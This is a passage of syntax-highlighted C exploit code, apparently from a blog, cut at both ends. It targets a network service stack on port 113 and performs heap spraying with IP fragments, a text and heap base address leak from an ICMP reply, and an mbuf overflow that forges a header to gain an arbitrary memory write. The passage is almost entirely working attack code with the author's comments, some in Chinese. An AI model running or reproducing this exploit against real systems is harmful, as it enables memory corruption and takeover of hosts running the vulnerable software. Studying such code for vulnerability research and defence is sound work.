class="keyword">sizeof</span>(from));</span><br><span class="line">        fromlen = <span class="keyword">sizeof</span>(from);</span><br><span class="line">        <span class="keyword">if</span> ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, <span class="number">0</span>,</span><br><span class="line">                              (struct sockaddr *)&amp;from, &amp;fromlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            status = errno;</span><br><span class="line">            <span class="keyword">if</span> (status == EAGAIN) &#123; <span class="comment">// EAGAIN = 11</span></span><br><span class="line">                dbg_printf(<span class="string">"No reply within %li seconds.\n"</span>, wait.tv_sec);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == EINTR) &#123; <span class="comment">// EINTR = 4</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">"recvfrom() failed "</span>);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">// End of error handling conditionals.</span></span><br><span class="line">        <span class="comment">// hexdump("recv", recv_ether_frame, 0x50);</span></span><br><span class="line">        dbg_printf(<span class="string">"recv count %d\n"</span>, count++);</span><br><span class="line">        <span class="keyword">if</span> ((((recv_ether_frame[<span class="number">12</span>] &lt;&lt; <span class="number">8</span>) + recv_ether_frame[<span class="number">13</span>]) ==</span><br><span class="line">             ETH_P_IP) &amp;&amp;</span><br><span class="line">            (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;</span><br><span class="line">            (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123;</span><br><span class="line">            <span class="comment">// Stop timer and calculate how long it took to get a reply.</span></span><br><span class="line">            (<span class="keyword">void</span>)gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">            dt = (<span class="keyword">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="number">1000.0</span> +</span><br><span class="line">                 (<span class="keyword">double</span>)(t2.tv_usec - t1.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line">            <span class="comment">// 底下这个可能会segfault</span></span><br><span class="line">            <span class="comment">// if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip,</span></span><br><span class="line">            <span class="comment">// INET_ADDRSTRLEN) == NULL) &#123;</span></span><br><span class="line">            <span class="comment">//     status = errno;</span></span><br><span class="line">            <span class="comment">//     fprintf(stderr, "inet_ntop() failed.\nError message: %s",</span></span><br><span class="line">            <span class="comment">//     strerror(status)); exit(EXIT_FAILURE);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            dbg_printf(<span class="string">"%g ms (%i bytes received)\n"</span>, dt, bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            hexdump(<span class="string">"ping recv"</span>, recv_ether_frame, bytes);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">if</span> (bytes &lt; <span class="number">0x200</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            text_base =</span><br><span class="line">                ((*(<span class="keyword">uint64_t</span> *)(recv_ether_frame + <span class="number">0x88</span>)) - <span class="number">0x7e7d01</span>) &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">            heap_base = (*(<span class="keyword">uint64_t</span> *)(recv_ether_frame + <span class="number">0x90</span>)) &amp; ~<span class="number">0xffffff</span>;</span><br><span class="line">            dbg_printf(<span class="string">"leak text_base: 0x%lx\n"</span></span><br><span class="line">                       <span class="string">"leak heap_base: 0x%lx\n"</span>,</span><br><span class="line">                       text_base, heap_base);</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// End if IP ethernet frame carrying ICMP_ECHOREPLY</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    close(s);</span><br><span class="line">    close(recvsd);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len, <span class="keyword">uint8_t</span> *write_data,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">int</span> write_data_len, <span class="keyword">int</span> spray_times)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">"xmzyshypnc"</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we spray to malloc all freed buf.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"oops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we finished the malloc of so_rcv and the mbuf.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">                                  <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have written faked mbuf struct"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    <span class="keyword">if</span> (stop_flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"trigger!"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have trigger the written to target addr.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真正malloc的大小是payloadlen + 64</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_ip_pkt</span><span class="params">(struct ip_pkt_info *pkt_info, <span class="keyword">uint8_t</span> *payload,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">int</span> payloadlen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed to get socket descriptor for using ioctl() "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">"%s"</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ioctl() failed to find interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(pkt_info-&gt;ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = pkt_info-&gt;MF;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off =</span><br><span class="line">        htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) + (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) +</span><br><span class="line">              ip_flags[<span class="number">3</span>] + (pkt_info-&gt;ip_off &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = pkt_info-&gt;ip_p;</span><br><span class="line">    <span class="comment">// iphdr.ip_p = IPPROTO_TCP;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), payload, payloadlen * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to set IP_HDRINCL "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to bind to interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendto() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">uint16_t</span> ip_id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcphdr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> payloadlen;</span><br><span class="line">    <span class="keyword">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line">    payload = allocate_strmem(IP_MAXPACKET);</span><br><span class="line"></span><br><span class="line">    payloadlen = size - <span class="number">84</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed to get socket descriptor for using ioctl() "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">"%s"</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ioctl() failed to find interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// dbg_printf("Index for interface %s is %i\n", interface, ifr.ifr_ifindex);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off = htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) +</span><br><span class="line">                         (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) + ip_flags[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TCP header</span></span><br><span class="line">    <span class="comment">// Source port number (16 bits)</span></span><br><span class="line">    tcphdr.th_sport = htons(<span class="number">60</span>);</span><br><span class="line">    <span class="comment">// Destination port number (16 bits)</span></span><br><span class="line">    tcphdr.th_dport = htons(<span class="number">80</span>);</span><br><span class="line">    <span class="comment">// Sequence number (32 bits)</span></span><br><span class="line">    tcphdr.th_seq = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Acknowledgement number (32 bits)</span></span><br><span class="line">    tcphdr.th_ack = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Reserved (4 bits): should be 0</span></span><br><span class="line">    